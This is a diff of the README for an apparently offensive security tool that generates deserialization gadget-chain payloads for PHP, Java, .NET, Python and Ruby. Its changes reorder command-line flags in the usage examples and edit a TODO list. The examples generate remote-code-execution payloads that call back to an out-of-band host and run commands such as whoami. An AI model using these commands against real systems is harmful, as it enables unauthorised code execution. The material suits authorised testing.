@@ -12,7 +12,7 @@ It attempts to generate all possible chains, managing the 🤯 **burden of the d
 
 This tool implement or invent no new technique. It is just a mashup of different tools.
 
-## Features
+## Features
 
 * Generates around 200 gadget chains in a "best effort" approach with default options and all possible formatters
 * Supported serializers: PHPGGC (PHP), YSOSerial (Java), YSOSerial\.Net (C# .Net), Pickle (Python), Ruby (GitHubSecurityLab/ruby-unsafe-deserialization)
@@ -37,27 +37,27 @@ python3 blackserial.py -s all -l
 
 Generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup <chain_id>.<domain>` system command (default command):
 ```
-python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b
+python3 blackserial.py -s php -b -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
 ```
 
 Same with Java but URL encoded and a custom command:
 ```
-python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -u -c "whoami"
+python3 blackserial.py -s java -u -c whoami -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com 
 ```
 
 Same with Python but Base64 urlsafe:
 ```
-python3 blackserial.py -s python -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu
+python3 blackserial.py -s python -bu -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
 ```
 
 Same with C# with 1 file by payload:
 ```
-python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu  -o1 --output ./payloads-dir/
+python3 blackserial.py -s csharp -bu -o1 --output ./payloads-dir/ -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
 ```
 
 An example with ruby:
 ```
-python3 blackserial.py -s ruby -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b
+python3 blackserial.py -s ruby -b -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
 ```
 
 ## Advanced examples
@@ -176,12 +176,10 @@ Under linux, blackserial uses wine to launch ysoserial.exe and thus it is slow. 
 * ysoserial\.net: XamlAssemblyLoadFromFile with formatter 'SoapFormatter'
 * phpggc: Symfony/RCE14 (PR opened)
 
-
-
 ## TODO
 
-* ruby
 * manage phar
+* plugins
 * docker
 * https://pyro4.readthedocs.io/en/stable/api/util.html
 
